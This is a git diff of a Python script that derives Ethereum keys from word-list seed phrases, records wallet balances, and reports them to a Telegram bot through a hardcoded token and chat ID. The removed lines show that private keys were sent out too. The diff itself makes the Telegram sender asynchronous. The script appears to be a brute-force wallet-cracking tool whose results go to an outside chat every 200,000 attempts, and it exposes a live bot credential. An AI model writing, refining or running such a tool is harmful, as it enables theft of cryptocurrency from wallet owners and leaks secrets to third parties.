@@ -13,6 +13,8 @@ import eth_utils
 import concurrent.futures
 import telegram
 from datetime import datetime
+import asyncio
+from telegram.constants import ParseMode
 
 
 script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -257,12 +259,12 @@ def generate_ethereum_keys(seed_phrase):
     except Exception as e:
         pass
 
-def sendTelegramMessage():
+async def sendTelegramMessage():
     # Define your Telegram bot token and chat ID
     bot_token = '5500299643:AAFqFy2q62ccRi3rX5i9BP91MyLoss0pXSA'
     chat_id = '1244387492'
 
-    # Create a Telegram bot object
+# Create a Telegram bot object
     bot = telegram.Bot(token=bot_token)
 
     # Connect to the database
@@ -287,10 +289,10 @@ def sendTelegramMessage():
 
             for row in rows:
                 public, private, bnb_b, eth_b = row
-                message_content += f"Public: {public}\nPrivate: {private}\nBNB_B: {bnb_b}\nETH_B: {eth_b}\n\n"
+                message_content += f"<b>Public:</b> {public}\n<b>BNB:</b> {bnb_b}\n<b>ETH:</b> {eth_b}\n\n"
 
             # Send the message to the Telegram chat
-            bot.send_message(chat_id=chat_id, text=message_content)
+            await bot.send_message(chat_id=chat_id, text=message_content, parse_mode=ParseMode.HTML)
 
     except Exception as e:
         print(f"Error while sending Telegram message: {e}")
@@ -301,13 +303,13 @@ def sendTelegramMessage():
         connection.close()
 
 
-def main():
+async def main():
     if check_internet_connection():
         # Proceed with your code here
         print("Connected to the internet. Continuing with the code.")
     else:
         print("Could not establish an internet connection.")
-    sendTelegramMessage()
+    await sendTelegramMessage()
 
     # Load your word list
     with open(file_path, "r") as file:
@@ -341,12 +343,12 @@ def main():
             executor.submit(generate_ethereum_keys, seed_phrase)
             count=count+1
             if(count==200000):
-                sendTelegramMessage()
+                await sendTelegramMessage()
                 count=0
 
 while True:
     try:
-        main()
+       asyncio.run(main())
     except Exception as e:
         print(f"An error occurred: {e}. Restarting in 60 seconds...")
         time.sleep(2)
